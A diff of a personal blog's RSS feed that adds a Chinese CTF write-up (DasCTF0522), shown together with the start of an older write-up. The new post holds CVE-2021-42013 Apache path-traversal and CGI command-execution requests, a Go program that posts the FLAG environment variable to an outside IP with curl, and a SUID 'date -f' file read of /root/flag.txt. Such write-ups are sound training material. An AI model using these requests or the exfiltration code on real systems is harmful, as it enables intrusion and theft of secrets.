@@ -1,4 +1,57 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/ctf/</link><description>Recent content in CTF on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 28 Mar 2022 10:04:27 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>CTFshow0222卷王杯 Wp</title><link>https://amiaaaz.github.io/2022/03/28/ctfshow-0222-juanwangcup-wp/</link><pubDate>Mon, 28 Mar 2022 10:04:27 +0800</pubDate><guid>https://amiaaaz.github.io/2022/03/28/ctfshow-0222-juanwangcup-wp/</guid><description>&lt;h2 id="easy-unserialize">easy unserialize&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/ctf/</link><description>Recent content in CTF on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 22 May 2022 17:25:29 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>DasCTF0522 Wp</title><link>https://amiaaaz.github.io/2022/05/22/dasctf0522-wp/</link><pubDate>Sun, 22 May 2022 17:25:29 +0800</pubDate><guid>https://amiaaaz.github.io/2022/05/22/dasctf0522-wp/</guid><description>&lt;h2 id="power-cookie">Power Cookie&lt;/h2>
+&lt;pre tabindex="0">&lt;code>GET /check
+cookie: admin=1
+&lt;/code>&lt;/pre>&lt;h2 id="魔法浏览器">魔法浏览器&lt;/h2>
+&lt;p>控制台给出需要用的UA头&lt;/p>
+&lt;pre tabindex="0">&lt;code>GET /
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75
+&lt;/code>&lt;/pre>&lt;h2 id="getme">getme&lt;/h2>
+&lt;p>页面提示&lt;code>pwd=/usr/local/apache2/&lt;/code>&lt;/p>
+&lt;p>尝试几个get参数，无&lt;/p>
+&lt;p>尝试配置文件/user/local/apache2/conf/httpd.conf，访问不到&lt;/p>
+&lt;p>注意到apache版本2.4.50 尝试&lt;a href="https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-42013/README.zh-cn.md">CVE-2021-42013&lt;/a>路径穿越&lt;/p>
+&lt;pre tabindex="0">&lt;code>GET /icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/flag
+&lt;/code>&lt;/pre>&lt;p>是fake flag，那直接rce&lt;/p>
+&lt;pre tabindex="0">&lt;code>POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
+echo;ls /diajgk/djflgak/qweqr/eigopl
+&lt;/code>&lt;/pre>&lt;p>得到flag的真实路径，再访问&lt;/p>
+&lt;pre tabindex="0">&lt;code>GET /icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/diajgk/djflgak/qweqr/eigopl/fffffflalllallalagggggggggg
+&lt;/code>&lt;/pre>&lt;h2 id="hackme">hackme&lt;/h2>
+&lt;p>/upload上传go源文件和编译好的elf文件&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;os/exec&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;os&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ttt&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">os&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Getenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;FLAG&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">cmd&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Command&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;curl&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;101.35.114.107:8426&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;-d&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ttt&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">cmd&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">CombinedOutput&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;combined out:\n%s\n&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fatalf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cmd.Run() failed with %s\n&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;combined out:\n%s\n&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="fxxkgo">fxxkgo&lt;/h2>
+&lt;p>原题 go ssti+jwt伪造，[LineCTF 2022]gotm&lt;/p>
+&lt;h2 id="ezcms">ezcms&lt;/h2>
+&lt;p>定位到sys/apps/controllers/admin/Update.php，有经典的后台下载zip并解压的功能&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220522171032396.png" alt="image-20220522171032396">&lt;/p>
+&lt;p>注意到下载中间用到了&lt;code>sys_auth&lt;/code>，有个全局&lt;code>key=GKwHuLj9AOhaxJ2&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220522171256971.png" alt="image-20220522171256971">&lt;/p>
+&lt;p>根据sys_auth生成对应的url，访问，蚁剑&lt;/p>
+&lt;h2 id="rootme">rootme&lt;/h2>
+&lt;p>suid提权&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>find / -perm -4000 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">LFILE&lt;/span>&lt;span style="color:#f92672">=&lt;/span>/root/flag.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>date -f &lt;span style="color:#111">$LFILE&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="问卷">问卷&lt;/h2>
+&lt;p>好好好&lt;/p></description></item><item><title>CTFshow0222卷王杯 Wp</title><link>https://amiaaaz.github.io/2022/03/28/ctfshow-0222-juanwangcup-wp/</link><pubDate>Mon, 28 Mar 2022 10:04:27 +0800</pubDate><guid>https://amiaaaz.github.io/2022/03/28/ctfshow-0222-juanwangcup-wp/</guid><description>&lt;h2 id="easy-unserialize">easy unserialize&lt;/h2>
 &lt;p>一个pop链的构造和throw error的绕过&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$talk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;111&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
